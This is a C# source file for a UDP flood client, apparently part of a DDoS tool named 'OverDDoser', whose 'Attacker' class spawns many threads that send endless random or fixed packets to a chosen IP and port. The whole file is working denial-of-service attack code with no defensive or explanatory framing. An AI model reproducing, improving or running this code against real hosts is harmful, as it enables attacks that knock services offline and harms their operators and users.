using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

namespace OverDDoserClient
{
    class Attacker
    {
        private string targetIP;
        private int port;
        private int delay;
        private bool RandomData;
        private int NumberOfThreads;
        private Socket socket;
        private Random random;
        private EndPoint ep;
        private byte[] buffer;
        private bool isFlooding = false;
        List<Thread> FlooderThreads;

        public Attacker(string targetIP, int port, int delay, int packetsize, int NumberOfThreads, bool UseRandomData)
        {
            this.targetIP = targetIP;
            this.port = port;
            this.delay = delay;
            this.NumberOfThreads = NumberOfThreads;
            ep = new IPEndPoint(IPAddress.Parse(targetIP), port);
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            random = new Random();
            FlooderThreads = new List<Thread>();
            buffer = new byte[packetsize];
            random.NextBytes(buffer);
            RandomData = UseRandomData;
        }


        private void SendRandomData()
        {
            while (true)
            {
                while (true)
                {
                    random.NextBytes(buffer);
                    socket.SendTo(buffer, ep);
                    Thread.Sleep(delay);
                }
            }
        }
        private void SendData()
        {
            while (true)
            {
                socket.SendTo(buffer, ep);
                Thread.Sleep(delay);
            }
        }
        public void StartFlooding()
        {
            if (isFlooding == false)
            {
                isFlooding = !isFlooding;
                if (RandomData == true)
                {
                    for (int i = 0; i < NumberOfThreads; i++)
                    {
                        Thread t = new Thread(SendRandomData);
                        t.Start();
                        FlooderThreads.Add(t);
                    }
                }
                else
                {
                    for (int i = 0; i < NumberOfThreads; i++)
                    {
                        Thread t = new Thread(SendData);
                        t.Start();
                        FlooderThreads.Add(t);
                    }
                }
            }
            
        }
        public void StopFlooding()
        {
            foreach (var t in FlooderThreads)
            {
                t.Abort();
            }
        }
    }
}
